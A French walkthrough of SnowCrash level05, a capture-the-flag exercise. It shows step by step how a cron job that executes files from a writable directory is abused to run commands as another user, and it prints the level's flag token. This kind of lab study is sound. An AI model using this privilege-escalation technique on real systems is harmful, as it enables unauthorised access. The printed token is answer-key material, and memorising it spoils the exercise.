# level05
## Observations

Dans ce level, nous semblons assez démuni, nous n'avons rien dans le home directory,
j'ai même pu verifier les fichiers de configuration locaux (`.bashrc`, `.profile`, `.bash_logout`).
Rien à exploiter.

Je décide ensuite de chercher sur le disque entier des fichiers appartenant à notre
utilisateur `level05`:

Avec la commande find:
```sh
find  / -user level05 -group -level05 2>/dev/null
```
Ici, rien de concluant.

Puis dans le doute, un fichier contenant le nom de l'utilisateur dans son nom:
```sh
level05@SnowCrash:~$ find / 2>/dev/null | grep level05
/etc/apache2/sites-available/level05.conf
/etc/apache2/sites-enabled/level05.conf
/var/mail/level05
/rofs/etc/apache2/sites-available/level05.conf
/rofs/etc/apache2/sites-enabled/level05.conf
/rofs/var/mail/level05
```

On a plusieurs fichiers, de  fichiers de configuration d'un serveur Apache, en l'observant,
j'ai l'impression qu'il s'agit de la configuration du serveur  HTTP du level précédent.

Mais on a aussi une boite mail local sous `/var/mail`.

En affichant ce mail: 
```sh
level05@SnowCrash:~$ cat /rofs/var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Le mail contient une instruction, `cron` à priori.
La commande est la suivante:
`su -c "sh /usr/sbin/openarenaserver" - flag05`

La partie `su -c <commande> - <user>`, nous permet de lancer une `commande`, avec
un `user`.
Cette `commande` fait appel à un executable: `/usr/sbin/openarenaserver`
De plus on notera la présence d'un `+`, nous indiquant la présence d'ACLs pour:
- `/var/mail/level05` nous donne les droits 'rw-' pour l'utilisateur `level05` (commande `getfacl`)
- `/usr/sbin/openarenaserver`, nous donne les droits 'rwx' pour l'utilisateur `level05` (commande `getfacl`)
> **Note:** Pour plus d'info sur les ACL, la [doc ubuntu](https://doc.ubuntu-fr.org/acl) est très complète.

On notera en plus que le priopriétaire de l'executable, `/usr/sbin/openarenaserver` est flag05
Il s'agit d'un script shell:
```sh
level05@SnowCrash:~$ cat -n /usr/sbin/openarenaserver
     1	#!/bin/sh
     2
     3	for i in /opt/openarenaserver/* ; do
     4		(ulimit -t 5; bash -x "$i")
     5		rm -f "$i"
     6	done
```

Ce script est construit de la façon suivante:
- ligne 1, le _sha-bang_, nous confirme l'utilisation de `bash`.
- ligne 3 à 6:
    - le programme boucle sur l'ensemble des fichiers contenus dans: `/opt/openarenaserver/`
    - Avec chaque fichier, il execute le contenue ce dernier (`bash -x`, cf `man bash`)
    - il limite le temps d'exeution de la commande à 5 secondes (`ulimit -t 5`, cf [ce lien](https://ss64.com/bash/ulimit.html))
    - enfin il supprime le dit fichier: `rm -f`

## Résolution
Ainsi pour résoudre ce level, il me faudra créer un fichier `getflag` dans, `/opt/openarenaserver/`.
Qui devra être executé par `flag05` (propriuétaire de l'executable).

Par acquis de conscience, je vais commencé par créer un fichier `id`.

```sh
level05@SnowCrash:~$ cat > /opt/openarenaserver/id
id
level05@SnowCrash:~$ /usr/sbin/openarenaserver
bash: /usr/sbin/openarenaserver: Permission denied
```

Premier echec, lançons le comme dans le mail:
```sh
level05@SnowCrash:~$ su -c "sh /usr/sbin/openarenaserver" - flag05
Password:
```

On nous demande un password, essayons sans le changement d'utilisateur, commande `su`:
```sh
level05@SnowCrash:~$ cat > /opt/openarenaserver/id
id
level05@SnowCrash:~$ sh /usr/sbin/openarenaserver
+ id
uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)
```

On a un problème à ce niveau, la commande est lancé avec l'utilisateur `level05`,
contrairement à ce que je pensais.

Je vais essayé d'activer l'instruction cron, contenue dans le mail grâce à la commande
crontab (pour avoir une sortie il faut que je pense à rediriger le flux).

```sh
level05@SnowCrash:~$ cat > /opt/openarenaserver/id
id > /tmp/out.log
level05@SnowCrash:~$ crontab /var/mail/level05
level05@SnowCrash:~$ crontab -l
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Il faut penser à éditer l'instruction cron avec `crontab -e` pour s'epargner l'attente:
```sh
level05@SnowCrash:~$ crontab -e
touch: cannot touch `/home/user/level05/.selected_editor': Permission denied
crontab: installing new crontab
level05@SnowCrash:~$ crontab -l
* * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

En moins d'une minute, on devrait pouvoir afficher nos logs:
```sh
level05@SnowCrash:~$ cat /tmp/out.log
uid=3005(flag05) gid=3005(flag05) groups=3005(flag05),1001(flag)
```

On recommence la procédure pour `getflag`:
```sh
level05@SnowCrash:~$ crontab -r
level05@SnowCrash:~$ cat > /opt/openarenaserver/getflag
getflag > /tmp/flag.out
level05@SnowCrash:~$ crontab /var/mail/level05 
level05@SnowCrash:~$ crontab -e
touch: cannot touch `/home/user/level05/.selected_editor': Permission denied
crontab: installing new crontab
level05@SnowCrash:~$ crontab -l
* * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ cat /tmp/flag.out
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

On obtient le flag, je peux passer au level suivant.
